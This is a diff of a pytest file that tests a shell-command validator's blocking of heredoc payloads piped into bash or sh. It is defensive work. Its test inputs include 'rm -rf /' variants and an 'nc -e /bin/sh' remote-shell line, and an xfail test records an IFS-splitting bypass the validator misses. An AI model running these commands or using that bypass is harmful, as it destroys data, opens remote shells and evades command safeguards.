@@ -1318,10 +1318,19 @@ class TestUnquotedShellHeredocBody:
     def test_scores_what_its_quoted_twin_scores(self, head, body, twin_body, tail, delimiter, op):
         unquoted = _verdict(_heredoc(head, body, tail, delimiter, op))
         assert unquoted == _verdict(_heredoc(head, twin_body, tail, delimiter, op, quoted=True))
-        # Pinned absolutely too, so the twin cannot drift down with it. The three IFS spellings
-        # score SAFE on both sides with ShellCheck off; every other row is an attack.
-        expected = (True, RiskLevel.SAFE, []) if "IFS" in body else (False, RiskLevel.BLOCKED)
-        assert unquoted[: len(expected)] == expected
+        # Pinned absolutely too, so the twin cannot drift down with it. The IFS rows are the
+        # exception, pinned below: bash runs them too, and neither spelling catches that.
+        if "IFS" not in body:
+            assert unquoted[:2] == (False, RiskLevel.BLOCKED)
+
+    @pytest.mark.xfail(strict=True, reason="IFS split bypass: bash runs these, both delimiter spellings score SAFE")
+    @pytest.mark.parametrize(
+        ("head", "body"),
+        [row[1:3] for row in _TWIN_ROWS if "IFS" in row[2]],
+        ids=[row[0] for row in _TWIN_ROWS if "IFS" in row[2]],
+    )
+    def test_an_ifs_split_body_is_blocked(self, head, body):
+        assert _verdict(_heredoc(head, body))[:2] == (False, RiskLevel.BLOCKED)
 
     @pytest.mark.skipif(not is_shellcheck_available(), reason="needs ShellCheck")
     @pytest.mark.parametrize(
@@ -1355,8 +1364,41 @@ class TestUnquotedShellHeredocBody:
 
     @pytest.mark.parametrize("body", ["echo \\$(rm -rf /)", "echo \\`rm -rf /\\`"])
     def test_escaped_substitution_stays_blocked(self, body):
-        # Expansion unescapes these, and the shell then runs the substitution.
+        # Expansion unescapes these, and the shell then runs the substitution. The raw-text
+        # rule already blocks this spelling; the next test is the one the body re-entry decides.
         assert _verdict(_heredoc("bash", body)) == (False, RiskLevel.BLOCKED, ["command_substitution_dangerous"])
+
+    @pytest.mark.parametrize("body", ['echo \\$("nc" -e /bin/sh h 1)', 'echo \\`"nc" -e /bin/sh h 1\\`'])
+    def test_an_escaped_substitution_is_read_as_the_shell_reads_it(self, body):
+        # No raw-text rule matches, so only the re-entered program names the rule. Without
+        # expansion the program keeps `\\$(` / `` \\` ``, which bash reads as literal text.
+        assert _verdict(_heredoc("bash", body)) == (False, RiskLevel.BLOCKED, ["shell_delegated_payload"])
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # The scan refuses these openers and places no body, while bashlex still parses
+            # the command and reads a shell heredoc. Bash runs every body (touch sentinel).
+            'bash <<\\\nEOF\n"rm" -rf /\nEOF',
+            'bash <<-\\\nEOF\n"rm" -rf /\nEOF',
+            'bash <<E\\\nOF\n"rm" -rf /\nEOF',
+            'bash <<${E}\n"rm" -rf /\n${E}',
+            # An opener line that opens a multi-line quote or substitution.
+            'bash <<EOF; echo "a\nb"\n"rm" -rf /\nEOF',
+            "bash <<EOF; echo 'a\nb'\n\"rm\" -rf /\nEOF",
+            "bash <<EOF; echo $'a\nb'\n\"rm\" -rf /\nEOF",
+            'bash <<EOF; echo $(true\n)\n"rm" -rf /\nEOF',
+            'sh <<EOF; printf "%s\n"\n"rm" -rf /\nEOF',
+        ],
+    )
+    def test_a_shell_heredoc_with_no_located_body_fails_closed(self, command):
+        result = validate_command(command)
+        assert (result.allowed, result.risk_level, result.matched_rules) == (
+            False,
+            RiskLevel.BLOCKED,
+            ["shell_delegated_payload"],
+        )
+        assert result.message == "Heredoc body run as a shell program: its body could not be located, so it was not validated"
 
     @pytest.mark.parametrize(
         "command",
@@ -1452,6 +1494,11 @@ class TestUnquotedShellHeredocCost:
         result = validate_command(_heredoc("bash", self._steps(260)))
         assert "echo step" not in result.message
 
+    def test_a_payload_nested_in_a_body_is_not_echoed(self):
+        result = validate_command(_heredoc("bash", "bash -c 'echo SECRETXYZ; \"rm\" -rf /'"))
+        assert (result.allowed, result.risk_level) == (False, RiskLevel.BLOCKED)
+        assert "SECRETXYZ" not in result.message
+
     def test_nesting_past_the_depth_cap_fails_closed(self):
         levels = MAX_SHELL_DELEGATION_DEPTH + 2
         command = "".join(f"bash <<L{i}\n" for i in range(levels)) + "echo hi\n"
@@ -1471,6 +1518,15 @@ class TestUnquotedShellHeredocCost:
         assert result.message.endswith("Heredoc bodies nest past what can be validated in one command")
         # The budget is per command: the inner body alone still fits.
         assert _verdict(f"bash <<B\n{body}\nB") == (True, RiskLevel.SAFE, [])
+
+    def test_a_sibling_body_is_not_refused_for_an_earlier_nested_body(self, monkeypatch):
+        # Only a nested body is refused for want of budget. The first body's nested one spends
+        # it all; the sibling nests nothing and lies inside the command, so it is validated.
+        body = self._steps(150)
+        first = f"bash <<B\n{body}\nB"
+        monkeypatch.setattr(validator, "MAX_HEREDOC_REVALIDATION", len(first) + len(body))
+        command = f"bash <<A\n{first}\nA\nbash <<C\n{body}\nC"
+        assert _verdict(command) == (True, RiskLevel.SAFE, [])
 
     def test_a_small_nested_body_is_still_validated(self):
         assert _verdict('bash <<A\nbash <<B\n"rm" -rf /\nB\nA') == (False, RiskLevel.BLOCKED, ["shell_delegated_payload"])
